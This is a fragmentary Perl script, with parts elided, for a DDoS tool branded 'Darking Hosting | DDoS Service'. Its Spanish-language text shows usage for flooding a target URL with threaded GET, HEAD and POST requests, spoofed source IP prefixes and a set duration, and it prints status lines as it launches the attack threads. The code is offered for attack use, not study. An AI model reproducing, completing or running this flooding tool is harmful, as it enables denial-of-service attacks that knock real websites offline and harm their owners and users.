...
sub comenzar {
	...
	system('title Servidores DDoS Dedicados');
	system('cls');
    if($porconexion < 1) {
        print "[-]Invalid arg 3...\n";
        exit;
...
----------------------------------| Darking Hosting | DDoS Service |----------------------------------
Comando: perl http-ghp.pl http://example/ 150 150 PPS 194.181 500
----------------------------------| Darking Hosting | DDoS Service |----------------------------------
Si o Si poner HTTP, NO HTTPS.
----------------------------------| Darking Hosting | DDoS Service |----------------------------------
CTRL + Z PARA FRENAR ATAQUE DDoS.
----------------------------------| Darking Hosting | DDoS Service |----------------------------------
Darking Solutions 2020';
	
	if($method eq "GHP"){
		print "\r\n[*] Objetivo: ",$host,"\n[*] Parche: ",$file,"\n[*] Puerto: ",$puerto,"\n[*] Metodo: GHP [GET + HEAD + POST]\n[*] Fake IPs: ",$ARGV[4] . ".*.*\n[*] Duracion: " . $ARGV[5] . "\n\n";
	}
	elsif($method eq "PPS"){
		print "\r\n[*] Objetivo: ",$host,"\n[*] Parche: ",$file,"\n[*] Puerto: ",$puerto,"\n[*] Metodo: PPS\n[*] Fake IPs: ",$ARGV[4] . ".*.*\n[*] Duracion: " . $ARGV[5] . "\n\n";
	}
    ...
    if($ipfake eq "") {
		...
		print "[i] Todos Los Threads Inciados!          \r\n";
    }
	else {
        # envio con ip...
        $sumador = control->new($ipfake);
		...
		print "[i] Todos Los Threads Lanzados!          \r\n";
    }
    print "[i] Ataque Iniciado!\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
